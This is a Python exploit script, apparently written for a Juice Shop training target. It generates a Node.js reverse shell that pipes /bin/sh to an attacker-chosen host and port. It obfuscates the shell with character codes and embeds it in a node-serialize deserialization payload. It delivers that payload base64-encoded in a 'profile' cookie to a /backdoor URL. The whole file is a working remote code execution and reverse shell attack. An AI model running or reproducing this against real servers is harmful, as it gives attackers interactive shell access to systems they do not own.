import sys
import base64
import requests

# python3.7 exploit_1_generate_payload.py 10.1.4.104 4444 http://juice-shop-charles.us-west1-a.securethebox.us/backdoor
if len(sys.argv) != 4:
    print("Usage: %s <LHOST> <LPORT> <TARGETURL>" % (sys.argv[0]))
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]
TARGETURL = sys.argv[3]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print("[+] LHOST = %s" % (IP_ADDR))
print("[+] LPORT = %s" % (PORT))
print("[+] TARGETURL = %s" % (TARGETURL))
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
        client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print("[+] Encoding")
PAYLOAD = charencode(NODEJS_REV_SHELL)

RCEPAYLOAD = "{\"rce\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}" % (PAYLOAD)

encoded = base64.b64encode(bytes(RCEPAYLOAD, 'utf-8'))
# print("eval(String.fromCharCode(%s))" % (PAYLOAD))
# print(str(encoded.decode("utf-8")))
# Make a request to server

# url = "http://localhost:3000/backdoor"
url = TARGETURL

querystring = {"":""}

headers = {
    'Cookie': "profile="+str(encoded.decode("utf-8")),
    'accept-encoding': "gzip, deflate",
    'Connection': "keep-alive"
    }

response = requests.request("GET", url, headers=headers, params=querystring)

print(response.text)
